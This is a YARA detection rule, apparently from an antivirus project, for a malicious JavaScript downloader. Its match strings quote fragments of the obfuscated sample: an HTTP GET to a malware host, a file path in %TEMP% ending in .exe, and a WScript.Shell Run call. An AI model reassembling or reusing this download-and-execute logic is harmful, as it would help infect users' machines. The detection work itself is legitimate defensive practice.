rule sig_20160328_7b010ec2b7e108b4937310483d24cdcd {
  meta:
    description = "datamaliciousorder - file 20160328_7b010ec2b7e108b4937310483d24cdcd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7293cc1c2e4949d6d0f1ff1a3320e53afe2cfbba6a9138d6dae1374102b47b21"

  strings:
    $s1  = "function Birutllm() {return Fqgrhtxpk[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"uieEPYQ3Zwx.exe\";};" fullword ascii
    $s2  = "do {WScript[Tgadrdamjv](Hxstgu() * 11)} while (Ecigpc[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "Ecigpc[Tasfhmflsm](\"GET\", \"http://myplaymobil.co.uk/k3iad\", false);" fullword ascii
    $s4  = "var Fqgrhtxpk = function Sywxovpe() {return WScript[Fbmmwe](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Rhmaxncwv(Llbtqhpz, Tfkijxklxo){return Llbtqhpz - Tfkijxklxo;};" fullword ascii
    $s6  = "function Ltzgqjkzq(Xqkpusyzxv){Fqgrhtxpk[\"Run\"](Xqkpusyzxv, Yggng, Yggng);};" fullword ascii
    $s7  = "function Ercupiwrnb() {return ((Pgsybvr == true) && (Pgsybvr == Mngkoa)) ? 1 : Yggng;};" fullword ascii
    $s8  = "function Lczcbnh(){return Fbmmwe;};" fullword ascii
    $s9  = " while (Vlqkt){" fullword ascii
    $s10 = "function Mefjflkba(Ykbjm) {var Fgrzm = (1, 2, 3, 4, 5, Ykbjm); return Fgrzm;};" fullword ascii
    $s11 = "function Zxiirmdj()" fullword ascii
    $s12 = "var Kgrsdjqpx = false;" fullword ascii
    $s13 = "return Rhmaxncwv(Rznbhl, Sydgsiy);" fullword ascii
    $s14 = "function Acgpv(){return Bjviqw;};" fullword ascii
    $s15 = "Mngkoa = true; " fullword ascii
    $s16 = "var Pgsybvr = false;" fullword ascii
    $s17 = "var Lzbpagnq = new this[\"Date\"]();" fullword ascii
    $s18 = "Pgsybvr = true; " fullword ascii
    $s19 = "var Mngkoa = false;" fullword ascii
    $s20 = "function Hxstgu(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}